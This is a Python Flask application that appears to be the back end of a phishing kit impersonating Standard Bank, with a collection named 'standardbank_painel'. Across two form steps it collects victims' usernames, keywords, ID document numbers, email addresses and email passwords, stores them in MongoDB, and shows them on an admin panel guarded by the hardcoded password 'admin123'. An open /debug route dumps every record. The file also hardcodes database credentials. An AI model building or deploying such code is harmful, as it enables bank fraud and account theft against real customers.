from flask import Flask, render_template, request, redirect
from pymongo import MongoClient
from bson.objectid import ObjectId
from datetime import datetime
import os

app = Flask(__name__)

# 🔗 Conexão com MongoDB Atlas
uri = "mongodb+srv://kingaristides:King2025@cluster0.mongodb.net/?retryWrites=true&w=majority"
client = MongoClient(uri)
db = client["painel"]
colecao = db["standardbank_painel"]

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/primeiraetapa", methods=["POST"])
def primeiraetapa():
    usuario = request.form.get("usuario")
    palavrachave = request.form.get("palavrachave")
    documento = request.form.get("documento")
    agora = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    return render_template("segundaetapa.html", usuario=usuario, palavrachave=palavrachave, documento=documento, agora=agora)

@app.route("/segundaetapa", methods=["POST"])
def segundaetapa():
    usuario = request.form.get("usuario")
    palavrachave = request.form.get("palavrachave")
    documento = request.form.get("documento")
    agora = request.form.get("agora")
    email = request.form.get("emailverificado")
    senha_email = request.form.get("senhaverificada")

    # Inserção no MongoDB
    registro = {
        "datahora": agora,
        "usuario": usuario,
        "palavrachave": palavrachave,
        "documento": documento,
        "email": email,
        "senha_email": senha_email
    }
    colecao.insert_one(registro)

    return render_template("agradecimento.html")

@app.route("/admin_login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        senha_admin = request.form.get("senhaadmin")
        if senha_admin == "admin123":
            registros = list(colecao.find().sort("datahora", -1))  # Mais recentes primeiro
            return render_template("admin.html", dados=registros)
        else:
            return "<h3>Senha incorreta!</h3><a href='/admin_login'>Tentar novamente</a>"
    return render_template("adminlogin.html")

@app.route("/excluir/<string:registro_id>", methods=["POST"])
def excluir(registro_id):
    colecao.delete_one({"_id": ObjectId(registro_id)})
    return redirect("/admin_login")

@app.route("/debug")
def debug():
    registros = list(colecao.find())
    return render_template("debug.html", conteudo=registros)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
